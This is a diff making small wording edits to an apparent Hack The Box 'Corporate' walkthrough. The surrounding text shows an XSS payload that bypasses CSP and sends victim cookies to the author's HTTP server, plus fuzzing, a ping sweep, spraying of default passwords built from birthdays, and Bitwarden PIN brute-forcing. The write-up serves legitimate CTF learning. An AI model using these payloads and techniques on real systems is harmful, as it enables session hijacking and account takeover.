@@ -283,7 +283,7 @@ The login button redirects to sso.corporate.htb login that we saw before:
 
 ![people.corporate.htb login redirects to sso.corporate.htb/login](/assets/images/Corporate/people.corporate.htb-login-redirects-to-sso.corporate.htb.png)
 
-There are bunch of routes here, so it's interesting. However, almost all redirect to /auth/login. Route / redirects to /dashboard that redirects to /auth/login and /static is for js and css files used in the web:
+There are bunch of routes here, so it's interesting. However, almost all redirect to /auth/login. Route / redirects to /dashboard that redirects to /auth/login. Route /static is for js and css files used in the web:
 
 ```bash
 ❯ ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 50 -v -u http://people.corporate.htb/FUZZ
@@ -371,7 +371,7 @@ And a HTML injection also works:
 
 ![HTML injection in 404 page](/assets/images/Corporate/html-injection-corporate.htb.png)
 
-Since here there also are Content-Security-Policy directives, we neither can't inject simple script tags and execute what we want, we have to use a script of the same page. A interesting one is /assets/js/analytics.min.js that is used with a ?v parameter in the source code of the main page and its value is reflected in the script:
+Since here there also are Content-Security-Policy directives implemented, we neither can't inject simple script tags and execute what we want, we have to use a script of the same page. A interesting one is /assets/js/analytics.min.js that is used with a ?v parameter in the source code of the main page and its value is reflected in the script:
 
 ![corporate.htb scripts](/assets/images/Corporate/corporate.htb-scripts.png)
 ![v parameter reflected in analytics.min.js script](/assets/images/Corporate/v-parameter-reflected-on-analytics.min.js.png)
@@ -394,11 +394,11 @@ As _analytics is defined in another script (/vendor/analytics.min.js), we have t
 
 #### exploitation path
 
-Since we have found a way to execute javascript code in a url and we have HTML injection in the chat, a nice way to send us the agent cookie is to insert a `<meta>` tag that redirects to the xss url and send to our http server the cookie:
+Since we have found a way to execute javascript code in a url and we have HTML injection in the chat, a nice way to send us the agent cookie (if flag HttpOnly is false) is to insert a `<meta>` tag that redirects to the xss url and send to our http server the cookie:
 
 > payload: ```<meta http-equiv="refresh" content="0; url='http://corporate.htb/<script src=%22/vendor/analytics.min.js%22></script><script src=%22/assets/js/analytics.min.js?v=document.location=`http://10.10.14.133/?c=${document.cookie}`%22>'">```
 
-To make it realistic as it was a real attack, I will write to my own index.html to redirect to support.corporate.htb so the victim doesn't see nothing strange since it redirects to my own server and the victim can see his cookie in the url. Also spawn the http server with python:
+To make it realistic as it was a real attack, I will write to my own index.html to redirect to support.corporate.htb so the victim doesn't see nothing strange. I will do this since it redirects to my own server and the victim can see his cookie in the url. Remember to start the http server with python:
 
 ```bash
 ❯ mkdir web-server
@@ -422,7 +422,7 @@ A thing to take into account is that in the profile I can see my email, birthday
 
 ![profile](/assets/images/Corporate/profile.png)
 
-In the chat, we have links for other users which url is `/employee/<ID>`, where I can see the same info as in my profile but for other users:
+In the chat, we have links for other users whose url is `/employee/<ID>`, where I can see the same info as in my profile but for other users:
 
 ![chat corporate](/assets/images/Corporate/chat-corporate.png)
 ![user url corporate](/assets/images/Corporate/user-url-corporate.png)
@@ -567,14 +567,14 @@ The most interesting files here is the .ovpn file that connect to the target mac
 
 ![vpn on port 1194 udp](/assets/images/Corporate/ovpn-connect.png)
 
-Downloading it and connecting, I can see that is adds the route 10.9.0.0/24 via 10.8.0.1:
+Downloading it and connecting, I can see that it adds the route 10.9.0.0/24 via 10.8.0.1:
 
 ```bash
 ❯ sudo openvpn hermina-leuschke.ovpn
 ```
 ![added routes for IPs vpn](/assets/images/Corporate/added-routes-vpn.png)
 
-I will map the network with this simple bash oneliner that goes through a loop from 1 to 255 (range of IPs valid here) and test for this hosts using ping and if the command exited successfully (that's why using the && operand), it will echo that the host is active. It's possible to see that 10.9.0.1 is active (which is the route IP) and 10.9.0.4:
+I will map the network with this simple bash oneliner that goes through a loop from 1 to 255 (range of IPs valid here) and test for this hosts using ping, and if the command exited successfully (that's why using the && operand), it will echo that the host is active. It's possible to see that 10.9.0.1 is active (which is the route IP) and 10.9.0.4:
 
 ```bash
 ❯ for i in $(seq 1 255);do timeout 1 bash -c "ping -c 1 10.9.0.$i" &>/dev/null && echo "Host 10.9.0.$i is active";done;wait
@@ -801,13 +801,13 @@ Nmap done: 2 IP addresses (2 hosts up) scanned in 154.36 seconds
            Raw packets sent: 153447 (6.752MB) | Rcvd: 147823 (5.913MB)
 ```
 
-In port 3004, its running gitea and in port 3128 a Proxmox virtual environment API, so that's why probably there are 2 hosts, 10.9.0.1 probably is for host machine and 10.9.0.4 a proxmox virtual machine. However, there is nothing interesting now.
+There is a SSH port in both hosts that we didn't have access before. In port 3004, its running gitea and in port 3128 a Proxmox virtual environment API, so that's why probably there are 2 hosts: 10.9.0.1 probably is for host machine and 10.9.0.4 a proxmox virtual machine. There is also a NFS port in 10.9.0.1 but as rpcbind is in the other host, we can't use it. So there is nothing interesting now.
 
 A thing to notice is that files are downloaded using an id, but it's not vulnerable to IDOR:
 
 ![file download not vulnerable to IDOR](/assets/images/Corporate/file-download-not-idor.png)
 
-However, there is a share functionality that I can use to share with myself some files, and looking at the request is also using an ID:
+However, there is a share functionality that I can use to share files with somebody, and looking at the request is also using an ID:
 
 > Note: I will take the email from my profile as saw before
 
@@ -819,7 +819,7 @@ but I can't share with myself:
 
 However, I can use the XSS of above to have access as another user in another private window (ctrl+mayus+p in firefox) and share with him.
 
-Now I also have access as Candido Hackett (in your case can also be different) and I can share with me a file (I will upload first one named share-this-file.txt to differentiate):
+Now I also have access as Candido Hackett (in your case can also be different) and I can share with him a file (I will first upload one named share-this-file.txt to differentiate):
 
 ![Shared file](/assets/images/Corporate/shared-normal-file.png)
 
@@ -869,7 +869,7 @@ The interesting file here is 'Welcome to Corporate 2023 Draft.pdf', which has in
 
 ![password and vpn instructions](/assets/images/Corporate/default-password-instructions.png)
 
-The password for each user is CorporateStarterDDMMYYYY where DDMMYYYY is his birthday and we are able to see that birthday in each user url as we saw before. I will modify the script of above to instead of printing each role and user, taking its birthday, test for the corresponding password in the login and if success, print the user with the password:
+The default password for each user is CorporateStarterDDMMYYYY where DDMMYYYY is his birthday and we are able to see that birthday in each user url as we saw before. What if some users forgot to change his password? I will modify the script of above to instead of printing each role and user, take its birthday, test for the corresponding password in the login and if it success, print the user with the password:
 
 ```python
 #!/usr/bin/python3
@@ -1151,7 +1151,7 @@ Nmap done: 2 IP addresses (2 hosts up) scanned in 154.36 seconds
            Raw packets sent: 153447 (6.752MB) | Rcvd: 147823 (5.913MB)
 ```
 
-We don't have nothing new but we can connect to ssh with those users (we also can with the first vpn we had) in 10.9.0.4:
+We don't have nothing new but we can connect to ssh with those users (we also could be able with the first vpn we had) in 10.9.0.4:
 
 ```bash
 ❯ cat hosts
@@ -1438,7 +1438,7 @@ A009040300010104F1FF0106500800FFFF050000800400FFFF7468656D65000000060D1014737973
 sqlite> 
 ```
 
-There is a bunch of data. In [this reddit post](https://www.reddit.com/r/firefox/comments/b5mome/how_can_i_read_the_sqlite_files_of_firefox_addons/), I can see it uses snappy, so I will do the same and successfully decrypt the data:
+There is a bunch of data. In [this reddit post](https://www.reddit.com/r/firefox/comments/b5mome/how_can_i_read_the_sqlite_files_of_firefox_addons/), I can see that the databases of firefox addons use snappy, so I will do the same and successfully decrypt the data:
 
 ```bash
 ❯ sqlite3 -line 3647222921wleabcEoxlt-eengsairo.sqlite 'select hex(data) from object_data' | awk '{print $2}' FS=' = ' > data.hex
@@ -3105,7 +3105,7 @@ Testing 4 digit pins from 0000 to 9999
 Pin not found
 ```
 
-This is because the kdfIterations for the encryption. In the script is using 100.000, but the default are 600.000 as seen in [this lines of code](https://github.com/bitwarden/clients/blob/main/libs/common/src/auth/models/domain/kdf-config.ts) in the bitwarden password manager:
+This is because the kdfIterations for the encryption. The default are 600.000 as seen in [this lines of code](https://github.com/bitwarden/clients/blob/main/libs/common/src/auth/models/domain/kdf-config.ts) in the bitwarden password manager but the script is using 100.000:
 
 ```rust
 let password_hash = Pbkdf2
